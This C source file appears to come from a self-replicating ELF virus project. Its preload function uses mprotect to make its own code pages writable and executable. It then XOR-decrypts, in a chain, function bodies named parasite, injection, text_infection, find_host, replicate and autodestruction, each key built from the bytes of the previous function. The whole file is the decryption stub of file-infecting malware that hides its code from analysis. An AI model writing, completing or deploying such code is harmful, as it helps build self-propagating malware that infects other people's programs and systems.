#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[LEFT];
}

static void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void preload(void)
{
	void *base = (void *)__entry;
	size_t diff = (unsigned long)base % PAGE_SIZE;

	if (mprotect(base - diff, ((void *)__exit - (void *)__entry) + PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		exit(errno);
	}

	struct s_keychain keychain = {0};

	update_keychain_left(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
	decrypt_left(&keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);

	update_keychain_right(&keychain, (char *)clean, (void *)replicate - (void *)clean);
	decrypt_right(&keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);

	update_keychain_left(&keychain, (char *)sign, (void *)clean - (void *)sign);
	decrypt_left(&keychain, (char *)clean, (void *)replicate - (void *)clean);

	update_keychain_right(&keychain, (char *)stub, (void *)sign - (void *)stub);
	decrypt_right(&keychain, (char *)sign, (void *)clean - (void *)sign);

	update_keychain_left(&keychain, (char *)parasite, (void *)stub - (void *)parasite);
	decrypt_left(&keychain, (char *)stub, (void *)sign - (void *)stub);

	update_keychain_right(&keychain, (char *)injection, (void *)parasite - (void *)injection);
	decrypt_right(&keychain, (char *)parasite, (void *)stub - (void *)parasite);

	update_keychain_left(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
	decrypt_left(&keychain, (char *)injection, (void *)parasite - (void *)injection);

	update_keychain_right(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
	decrypt_right(&keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	update_keychain_left(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
	decrypt_left(&keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	update_keychain_right(&keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
	decrypt_right(&keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	update_keychain_left(&keychain, (char *)criteria, (void *)corruption - (void *)criteria);
	decrypt_left(&keychain, (char *)corruption, (void *)text_infection - (void *)corruption);

	update_keychain_right(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
	decrypt_right(&keychain, (char *)criteria, (void *)corruption - (void *)criteria);

	update_keychain_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
	decrypt_left(&keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

	update_keychain_right(&keychain, (char *)war, (void *)find_host - (void *)war);
	decrypt_right(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);

	update_keychain_left(&keychain, (char *)__entry, (void *)war - (void *)__entry);
	decrypt_left(&keychain, (char *)war, (void *)find_host - (void *)war);
}
